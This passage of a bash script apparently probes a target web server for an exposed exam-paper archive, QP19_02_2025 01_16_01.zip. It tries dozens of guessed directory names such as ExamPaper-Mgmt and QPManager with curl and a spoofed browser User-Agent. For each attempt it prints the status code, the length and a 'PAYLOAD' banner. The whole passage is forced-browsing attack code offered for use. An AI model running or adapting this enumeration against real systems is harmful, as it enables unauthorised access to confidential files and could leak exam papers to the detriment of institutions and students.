" "${target}ProcessingQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerDataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFilePanel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFilePanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFilePanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
